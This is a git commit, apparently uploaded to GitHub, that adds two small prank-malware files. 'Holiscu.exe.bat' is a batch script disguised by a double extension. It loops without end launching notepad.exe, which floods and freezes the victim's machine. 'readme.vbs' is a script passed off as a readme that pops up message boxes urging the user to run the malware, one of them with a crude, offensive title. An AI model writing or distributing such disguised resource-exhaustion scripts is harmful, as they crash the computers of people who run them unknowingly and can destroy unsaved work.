4d6130f051b5964942ebbc2358cda8a2fa71954f
wxzzgs <154992220+wxzzgs@users.noreply.github.com>
2025-05-02 20:36:54 -0500

    Add files via upload

---
+++ Metholyn.Exe/Holiscu.exe.bat
@@ -0,0 +1,6 @@
+@echo off
+set loopcount=69420
+:loop
+start notepad.exe
+goto :loop
+start https://www.bing.com/videos/riverview/relatedvideo?q=Trichloromethane+music&ru=%2fsearch%3fq%3dTrichloromethane%2bmusic%26FORM%3dHDRSC1&mmscn=vwrc&mid=8410A81C6294D87DB49C8410A81C6294D87DB49C&FORM=WRVORC
---
+++ Metholyn.Exe/readme.vbs
@@ -0,0 +1,4 @@
+
+x=msgbox("RunMalware?",16,"Run?")
+x=msgbox("Are you sure?",16,"Are you sure?")
+x=msgbox("Run them booth at the same time",16,"raper?")
